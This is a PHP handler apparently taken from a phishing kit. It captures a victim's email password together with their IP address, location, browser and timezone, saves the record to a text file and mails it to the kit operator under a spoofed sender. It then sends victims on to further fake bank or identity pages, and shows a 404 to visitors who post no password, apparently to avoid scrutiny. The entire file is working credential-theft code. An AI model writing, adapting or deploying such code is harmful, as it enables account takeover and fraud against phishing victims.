<?php
if(isset($_POST['password'])){
		 	include '../mine.php';
	session_start();
	$msg="=========== <[ -💎 ".$scamname."- 2nd MAIL ACCESS 💎 ]> ===========\r\n";
	$msg.="EMAIL		: {$_SESSION['EML']}\r\n";
	$msg.="PASS		: {$_POST['password']}\r\n";
	$msg.="---------------------- IP Info ----------------------\r\n";
	$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
	$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
	$msg.="SCREEN		: {$_SESSION['screen']}\r\n";
	$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
	$msg.="TIME		: ".now()." GMT\r\n";
	$msg.="=========== <[ ♥ Gift to Brother KlodVsKy ♥ ]> ===========\r\n\r\n\r\n";
		if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
	$subject="-".$scamname."- ✅ 2nd MAIL ACCESS ✅ [".$_SESSION['EML']."] From [".$_SESSION['ip_countryName']."]";
	$headers="From: 💎KlodVsky💎 <newlogin@sh33nz0.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
		if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
}	if ($show_bank=="yes") {
exit(header("Location: ../../app/bank"));
}elseif ($show_identity=="yes") {
    exit(header("Location: ../../app/identity"));
}else{
    exit(header("Location: ../../app/thanks"));
}
}
if(!isset($_POST['password'])){
     header('HTTP/1.0 404 Not Found');
}
?>